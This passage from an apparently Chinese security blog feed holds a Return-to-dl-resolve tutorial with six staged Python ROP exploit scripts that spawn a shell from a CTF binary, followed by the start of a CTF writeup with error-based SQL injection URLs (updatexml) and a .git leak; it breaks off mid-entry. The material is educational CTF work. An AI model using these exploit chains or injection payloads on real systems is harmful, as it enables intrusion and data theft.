7</code>,对应<code>R_386_JUMP_SLOT</code><br><a href="/images/Return-to-dl-resolve/1459409118762.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459409118762.png" alt="Alt text"></a></p><p>（4）其中<code>.dynstr</code>节包含了动态链接的字符串。这个节区以<code>\x00</code>作为开始和结尾，中间每个字符串也以<code>\x00</code>间隔。如图，<code>Elf32_Sym[5]-&gt;st_name = 0x54</code>,所以<code>.dynstr</code>加上<code>0x54</code>的偏移量，就是字符串<code>write</code><br><a href="/images/Return-to-dl-resolve/1459414521835.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459414521835.png" alt="Alt text"></a></p><p>（5）其中<code>.plt</code>节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。如图，当程序执行<code>call write@plt</code>时，实际会跳到<code>0x80483c0</code>去执行。<br><a href="/images/Return-to-dl-resolve/1459415839271.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459415839271.png" alt="Alt text"></a></p><h5 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h5><p>程序在执行的过程中，可能引入的有些C库函数到结束时都不会执行。所以ELF采用延迟绑定的技术，在第一次调用C库函数是时才会去寻找真正的位置进行绑定。</p><p>具体来说，在前一部分我们已经知道，当程序执行<code>call write@plt</code>时，实际会跳到<code>0x80483c0</code>去执行。而<code>0x80483c0</code>处的汇编代码仅仅三行。我们来看一下这三行代码做了什么。<br><a href="/images/Return-to-dl-resolve/1459415839271.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459415839271.png" alt="Alt text"></a><br>第一行，上一部分也提到了<code>0x804a010</code>是<code>write</code>的GOT表位置，当我们第一次调用<code>write</code>时，其对应的GOT表里并没有存放<code>write</code>的真实地址，而是下一条指令的地址。第二、三行，把<code>reloc_arg=0x20</code>作为参数推入栈中，跳到<code>0x8048370</code>继续执行。<br><a href="/images/Return-to-dl-resolve/1459417176752.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459417176752.png" alt="Alt text"></a></p><p><code>0x8048370</code>再把<code>link_map = *(GOT+4)</code>作为参数推入栈中，而<code>*(GOT+8)</code>中保存的是<code>_dl_runtime_resolve</code>函数的地址。因此以上指令相当于执行了<code>_dl_runtime_resolve(link_map, reloc_arg)</code>，该函数会完成符号的解析，即将真实的<code>write</code>函数地址写入其<code>GOT</code>条目中，随后把控制权交给<code>write</code>函数。<br><a href="/images/Return-to-dl-resolve/1459417932071.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459417932071.png" alt="Alt text"></a></p><p>其中<code>_dl_runtime_resolve</code>是在<code>glibc-2.22/sysdeps/i386/dl-trampoline.S</code>中用汇编实现的。<code>0xf7ff04fb</code>处即调用<code>_dl_fixup</code>，并且通过寄存器传参。<br><a href="/images/Return-to-dl-resolve/1459425491545.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459425491545.png" alt="Alt text"></a></p><p>其中<code>_dl_fixup</code>是在<code>glibc-2.22/elf/dl-runtime.c</code>实现的，我们只关注一些主要函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure><p>首先通过参数<code>reloc_arg</code>计算重定位入口，这里的<code>JMPREL</code>即<code>.rel.plt</code>，<code>reloc_offset</code>即<code>reloc_arg</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const PLTREL *const reloc &#x3D; (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure><p>然后通过<code>reloc-&gt;r_info</code>找到<code>.dynsym</code>中对应的条目。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const ElfW(Sym) *sym &#x3D; &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure><p>这里还会检查<code>reloc-&gt;r_info</code>的最低位是不是<code>R_386_JUMP_SLOT=7</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) &#x3D;&#x3D; ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure><p>接着通过<code>strtab + sym-&gt;st_name</code>找到符号表字符串，<code>result</code>为libc基地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result &#x3D; _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);</span><br></pre></td></tr></table></figure><p><code>value</code>为libc基址加上要解析函数的偏移地址，也即实际地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value &#x3D; DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);</span><br></pre></td></tr></table></figure><p>最后把<code>value</code>写入相应的GOT表条目中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure><h4 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h4><ol><li>控制EIP为PLT[0]的地址，只需传递一个<code>index_arg</code>参数</li><li>控制<code>index_arg</code>的大小，使<code>reloc</code>的位置落在可控地址内</li><li>伪造<code>reloc</code>的内容，使<code>sym</code>落在可控地址内</li><li>伪造<code>sym</code>的内容，使<code>name</code>落在可控地址内</li><li>伪造<code>name</code>为任意库函数，如<code>system</code></li></ol><h5 id="控制EIP"><a href="#控制EIP" class="headerlink" title="控制EIP"></a>控制EIP</h5><p>首先确认一下进程当前开了哪些保护<br><a href="/images/Return-to-dl-resolve/1459398186541.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459398186541.png" alt="Alt text"></a></p><p>由于程序存在栈缓冲区漏洞，我们可以用PEDA很快定位覆写EIP的位置。</p><p><a href="/images/Return-to-dl-resolve/1459398079809.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459398079809.png" alt="Alt text"></a></p><h5 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h5><p>我们先写一个ROP链，直接返回到<code>write@plt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">offset &#x3D; 112</span><br><span class="line"></span><br><span class="line">addr_plt_read  &#x3D; 0x08048390   # objdump -d -j.plt bof | grep &quot;read&quot;</span><br><span class="line">addr_plt_write &#x3D; 0x080483c0   # objdump -d -j.plt bof | grep &quot;write&quot;</span><br><span class="line"></span><br><span class="line">#.&#x2F;rp-lin-x86  --file&#x3D;bof --rop&#x3D;3 --unique &gt; gadgets.txt</span><br><span class="line">pppop_ret &#x3D; 0x0804856c</span><br><span class="line">pop_ebp_ret   &#x3D;  0x08048453</span><br><span class="line">leave_ret &#x3D; 0x08048481</span><br><span class="line"></span><br><span class="line">stack_size &#x3D; 0x800</span><br><span class="line">addr_bss   &#x3D; 0x0804a020   # readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">base_stage &#x3D; addr_bss + stack_size</span><br><span class="line"></span><br><span class="line">target &#x3D; &quot;.&#x2F;bof&quot;</span><br><span class="line">io   &#x3D; zio((target))</span><br><span class="line"></span><br><span class="line">io.read_until(&#39;Welcome to XDCTF2015~!\n&#39;)</span><br><span class="line"># io.gdb_hint([0x80484bd])</span><br><span class="line"></span><br><span class="line">buf1  &#x3D; &#39;A&#39; * offset</span><br><span class="line">buf1 +&#x3D; l32(addr_plt_read)</span><br><span class="line">buf1 +&#x3D; l32(pppop_ret)</span><br><span class="line">buf1 +&#x3D; l32(0)</span><br><span class="line">buf1 +&#x3D; l32(base_stage)</span><br><span class="line">buf1 +&#x3D; l32(100)</span><br><span class="line">buf1 +&#x3D; l32(pop_ebp_ret)</span><br><span class="line">buf1 +&#x3D; l32(base_stage)</span><br><span class="line">buf1 +&#x3D; l32(leave_ret)</span><br><span class="line">io.writeline(buf1)</span><br><span class="line"></span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_write)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><p>最后会把我们输入的<code>cmd</code>打印出来<br><a href="/images/Return-to-dl-resolve/1459438836360.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459438836360.png" alt="Alt text"></a></p><h5 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h5><p>这次我们控制EIP返回到<code>PLT0</code>，要带上<code>index_offset</code>。这里我们修改一下<code>buf2</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">index_offset   &#x3D; 0x20</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><p>同样会把我们输入的<code>cmd</code>打印出来<br><a href="/images/Return-to-dl-resolve/1459439191206.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459439191206.png" alt="Alt text"></a></p><h5 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h5><p>这一次我们控制<code>index_offset</code>，使其指向我们伪造的<code>fake_reloc</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   &#x3D; 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   &#x3D; (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write &#x3D; 0x804a020</span><br><span class="line">r_info         &#x3D; 0x507</span><br><span class="line">fake_reloc     &#x3D; l32(addr_got_write) + l32(r_info)</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; fake_reloc</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><p>同样会把我们输入的<code>cmd</code>打印出来<br><a href="/images/Return-to-dl-resolve/1459442727696.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459442727696.png" alt="Alt text"></a></p><h5 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h5><p>这一次我们伪造<code>fake_sym</code>，使其指向我们控制的<code>st_name</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   &#x3D; 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   &#x3D; (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write &#x3D; 0x804a020</span><br><span class="line">addr_dynsym    &#x3D; 0x080481d8</span><br><span class="line">addr_dynstr    &#x3D; 0x08048268</span><br><span class="line">fake_sym       &#x3D; base_stage + 36</span><br><span class="line">align          &#x3D; 0x10 - ((fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">fake_sym       &#x3D; fake_sym + align</span><br><span class="line">index_dynsym   &#x3D; (fake_sym - addr_dynsym) &#x2F; 0x10</span><br><span class="line">r_info         &#x3D; (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     &#x3D; l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        &#x3D; 0x54</span><br><span class="line">fake_sym       &#x3D; l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; fake_reloc</span><br><span class="line">buf2 +&#x3D; &#39;B&#39; * align</span><br><span class="line">buf2 +&#x3D; fake_sym </span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><p>同样会把我们输入的<code>cmd</code>打印出来<br><a href="/images/Return-to-dl-resolve/1459442523856.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459442523856.png" alt="Alt text"></a></p><h5 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h5><p>这次把<code>st_name</code>指向我们伪造的字符串<code>write</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   &#x3D; 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   &#x3D; (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write &#x3D; 0x804a020</span><br><span class="line">addr_dynsym    &#x3D; 0x080481d8</span><br><span class="line">addr_dynstr    &#x3D; 0x08048268</span><br><span class="line">addr_fake_sym  &#x3D; base_stage + 36</span><br><span class="line">align          &#x3D; 0x10 - ((addr_fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">addr_fake_sym  &#x3D; addr_fake_sym + align</span><br><span class="line">index_dynsym   &#x3D; (addr_fake_sym - addr_dynsym) &#x2F; 0x10</span><br><span class="line">r_info         &#x3D; (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     &#x3D; l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        &#x3D; (addr_fake_sym + 16) - addr_dynstr</span><br><span class="line">fake_sym       &#x3D; l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; fake_reloc</span><br><span class="line">buf2 +&#x3D; &#39;B&#39; * align</span><br><span class="line">buf2 +&#x3D; fake_sym</span><br><span class="line">buf2 +&#x3D; &quot;write\x00&quot;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><p>同样会把我们输入的<code>cmd</code>打印出来<br><a href="/images/Return-to-dl-resolve/1459442264800.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459442264800.png" alt="Alt text"></a></p><h5 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h5><p>替换<code>write</code>为<code>system</code>,并修改<code>system</code>的参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   &#x3D; 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   &#x3D; (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write &#x3D; 0x804a020</span><br><span class="line">addr_dynsym    &#x3D; 0x080481d8</span><br><span class="line">addr_dynstr    &#x3D; 0x08048268</span><br><span class="line">addr_fake_sym  &#x3D; base_stage + 36</span><br><span class="line">align          &#x3D; 0x10 - ((addr_fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">addr_fake_sym  &#x3D; addr_fake_sym + align</span><br><span class="line">index_dynsym   &#x3D; (addr_fake_sym - addr_dynsym) &#x2F; 0x10</span><br><span class="line">r_info         &#x3D; (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     &#x3D; l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        &#x3D; (addr_fake_sym + 16) - addr_dynstr</span><br><span class="line">fake_sym       &#x3D; l32(st_name) + l32(0) + l32(0) + l32(0x12)</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; &#39;aaaa&#39;</span><br><span class="line">buf2 +&#x3D; &#39;aaaa&#39;</span><br><span class="line">buf2 +&#x3D; fake_reloc</span><br><span class="line">buf2 +&#x3D; &#39;B&#39; * align</span><br><span class="line">buf2 +&#x3D; fake_sym</span><br><span class="line">buf2 +&#x3D; &quot;system\x00&quot;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure><p>得到一个<code>shell</code><br><a href="/images/Return-to-dl-resolve/1459442011940.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459442011940.png" alt="Alt text"></a></p><h5 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h5><p>以上只是叙述原理，当然你比较懒的话，这里已经有成熟的工具辅助编写利用脚本<a href="https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py">roputils</a></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>【1】<a href="https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=elf/elf.h">ELF文件格式</a><br>【2】<a href="http://www.xfocus.net/articles/200201/337.html">ELF动态解析符号过程</a><br>【3】<a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve">Return to dl-resolve</a><br>【4】<a href="http://inaz2.hatenablog.com/entry/2014/07/15/023406">ROP stager + Return-to-dl-resolveによるASLR+DEP回避</a><br>【5】<a href="http://rk700.github.io/article/2015/08/09/return-to-dl-resolve">Return to dl-resolve</a><br>【6】<a href="http://www.inforsec.org/wp/?p=389">通过ELF动态装载机制进行漏洞利用</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三届上海市大学生网络安全大赛　</title>
      <link href="2017-shwas-Writeup-SeeSea.html"/>
      <url>2017-shwas-Writeup-SeeSea.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>下载app，加入圈子，查看flag</p><h1 id="Some-Words"><a href="#Some-Words" class="headerlink" title="Some Words"></a>Some Words</h1><p>题目拦截了union,and,=等关键字，但是没有拦截select mid from ascii等关键字，可以利用运算符进行盲注</p><h1 id="Some-Words-1"><a href="#Some-Words-1" class="headerlink" title="Some Words"></a>Some Words</h1><p>题目拦截了union,and,=等关键字，但是没有拦截select mid from ascii等关键字，可以利用运算符进行盲注</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/33577521.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/33577521.jpg"></a></p><p>但是过于麻烦，可以爆错，那就试试报错注入<br><code>http://cac7cafcbee440438320c8c23ded71a2fb677909ba534c05.game.ichunqiu.com/index.php?id=updatexml(1,concat(0x7e,(select database() limit 1,1),0x7e),1)</code> 得到当前库，然后得到表和列，最后查询flag</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/44572178.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/44572178.jpg"></a></p><p>得到前32位，mid一下得到后面<code>http://cac7cafcbee440438320c8c23ded71a2fb677909ba534c05.game.ichunqiu.com/index.php?id=updatexml(1,concat(0x7e,(select%20mid(f14g,32,100) from f14g  limit 0,1),0x7e),1)</code></p><h1 id="classical"><a href="#classical" class="headerlink" title="classical"></a>classical</h1><p><a href="https://quipqiup.com/">https://quipqiup.com</a><br>替换密码，在上面的链接解决，得到如下：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In cryptography, a classical cipher is a type of cipher that was used historically but now has fallen, for the most part, into disuse. In contrast to modern cryptographic algorithms, most classical ciphers can be practically computed and solved by hand. However, LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9 they are also usually very simple to break with modern technology. The term includes the simple systems used since Greek and Roman times, the elaborate Renaissance ciphers, World War II cryptography such as the Enigma machine and beyond. A quick brown fox jump over the lazy dog.</span><br></pre></td></tr></table></figure><p>其中<code>LyjtL3fvnSRlo2xvKIjrK2ximSHkJ3ZhJ2Hto3x9</code>这串字符串应该还有一层加密，猜测是还有一层古典密码，尝试去跑凯撒<br>把凯撒的各种情况跑出来后，进行 <code>base64</code> 解码就能得到 <code>flag</code></p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/39740735.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/39740735.jpg"></a></p><h1 id="Welcome-To-My-Blog"><a href="#Welcome-To-My-Blog" class="headerlink" title="Welcome To My Blog"></a>Welcome To My Blog</h1><p>发现有 <code>.git</code> 目录，尝试恢复git <a href="https://ring0.me/2015/05/recover-code-from-corrupt-git-repo/">https://ring0.me/2015/05/recover-code-from-corrupt-git-repo/</a><br><a href="http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/.git/">http://8fdb0c9fce8c40d28cd083b3719dfa8c35b5b80615034dfe.game.ichunqiu.com/.git/</a></p><figure 